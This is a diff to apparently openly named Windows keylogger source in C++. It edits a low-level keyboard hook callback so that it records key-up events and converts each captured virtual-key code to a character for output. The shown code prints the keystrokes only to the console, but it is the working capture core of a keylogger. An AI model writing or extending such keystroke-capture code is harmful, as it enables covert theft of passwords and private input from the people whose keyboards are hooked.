@@ -1,6 +1,7 @@
 #include "../include/keylogger.h"
 #include <Windows.h>
 #include <cstdio>
+#include <iostream>
 
 // Hook handler.
 HHOOK hook;
@@ -12,11 +13,12 @@ LRESULT CALLBACK VKeyCodeCb(int code, WPARAM wParam, LPARAM lParam) {
     if (code >= 0)
     {
         // If event is keystroke.
-        if (wParam == WM_KEYDOWN)
+        if (wParam == WM_KEYUP)
         {
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
             // a key (non-system) is pressed.
-            printf("Key Pressed: %lu\n", kbdStruct.vkCode);
+            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+            char vkChar = MapVirtualKey(kbdStruct.vkCode, MAPVK_VK_TO_CHAR);
+            std::cout << vkChar << std::endl;
         }
     }
 
